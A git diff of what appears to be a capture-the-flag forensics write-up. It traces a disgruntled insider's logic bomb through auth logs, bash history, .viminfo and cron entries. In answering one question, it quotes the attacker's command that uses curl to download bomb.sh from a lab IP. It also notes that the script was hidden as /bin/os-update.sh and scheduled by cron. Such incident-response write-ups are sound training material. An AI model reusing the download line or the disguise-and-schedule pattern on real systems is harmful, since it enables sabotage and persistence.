@@ -41,10 +41,12 @@ From the same image above, the command was ran from the **/home/cybert** working
 
 ![desc.](images/)
 
+---
+
 *Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.*
 
 ### 3. Which user was created after the package from the previous task was installed?
-Searching for the **adduser** string pointed out the user creation of **it-admin**. This was achieved by using the command:
+Searching for the "adduser" string pointed out the user creation of **it-admin**. This was achieved by using the command:
 
 ```
 grep sudo auth.log* | grep adduser
@@ -53,7 +55,7 @@ grep sudo auth.log* | grep adduser
 ![desc.](images/)
 
 ### 4. A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
-When editing the sudoers file, **visudo** is used. To know when the file might have been last updated, knowing when the command was ran can be an initial step through auth logs. It also made sense that the sudoers file were accessed right after creating the it-admin account. 
+When editing the sudoers file, visudo is used. To know when the file might have been last updated, knowing when the command was ran can be an initial step through auth logs. It also made sense that the sudoers file were accessed right after creating the it-admin account. The sudoers file was update on **Dec 28 06:27:34**. This was achieved by using the command:
 
 ```
 grep sudo auth.log* | grep visudo
@@ -62,7 +64,7 @@ grep sudo auth.log* | grep visudo
 ![desc.](images/)
 
 ### 5. A script file was opened using the "vi" text editor. What is the name of this file?
-By searching for the **vi** command, the **bomb.sh** script was tracked down. This was validated by the user that ran it, the attacker created account, it-admin.
+By searching for the "vi" command, the **bomb.sh** script was tracked down. This was validated by the user that ran it, the attacker created account, it-admin. This was achieved by using the command:
 
 ```
 grep sudo auth.log* | grep vi
@@ -70,35 +72,67 @@ grep sudo auth.log* | grep vi
 
 ![desc.](images/)
 
+---
+
 *That **bomb.sh** file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.*
 
 ### 6. What is the command used that created the file **bomb.sh**?
 
 *Tip: The command was run by a different user account. Look at the ".bash_history" in the user's home directory.*
 
-By going to the **/home/it-admin** directory and inspecting its bash history, the command to download the script was identified.
+By going to the /home/it-admin directory and inspecting its bash history, the command (**curl 10.10.158.38:8080/bomb.sh --output bomb.sh**) to download the script was identified. This was achieved by using the command:
+
+```
+cat .bash_history
+```
 
 ![desc.](images/)
 
 ### 7. The file was renamed and moved to a different directory. What is the full path of this file now?
+
 *Tip: The vi text editor can edit and save files to a different location. Check out the history of vi by looking for ".viminfo".*
+
+By investigating the Command Line History of .viminfo, bomb.sh was saved and renamed to **/bin/os-update.sh**. This was achieved by using the command:
+
+```
+vi .viminfo
+```
 
 ![desc.](images/)
 
-### 8. When was the file from the previous question last modified? (Format: Month Day HH:MM)
+### 8. When was the file from the previous question last modified? (Format: Month Day HH:MM) This was achieved by using the command:
+The last modification date of the os-update.sh file were identified by listing the contents of the /bin directory. This was achieved by using the command:
+
+```
+ls -l
+```
 
 ![desc.](images/)
 
 ### 9. What is the name of the file that will get created when the file from the first question executes?
+From the same image above, reading the file shows that **goodbye.txt.** will be created if it gets executed. This was achieved by using the command:
+
+```
+cat os-update.sh
+```
 
 ![desc.](images/)
+
+---
 
 *So we have a file and a motive. The question we now have is: how will this file be executed?*
 
 *Surely, he wants it to execute at some point?*
 
-### 10. At what time will the malicious file trigger? (Format: HH:MM AM/PM)
+### 10. At what time will the malicious file trigger? (Format: HH:MM AM/PM) This was achieved by using the command:
+
 *Tip: Check out the crontab and convert the schedule expression using a site like https://crontab.guru/.*
+
+By reading all the cron files and grepping for os-update.sh, its cron job were located. This was achieved by using the command:
+
+```
+cat cron* | grep "os-update.sh"
+```
 
 ![desc.](images/)
 
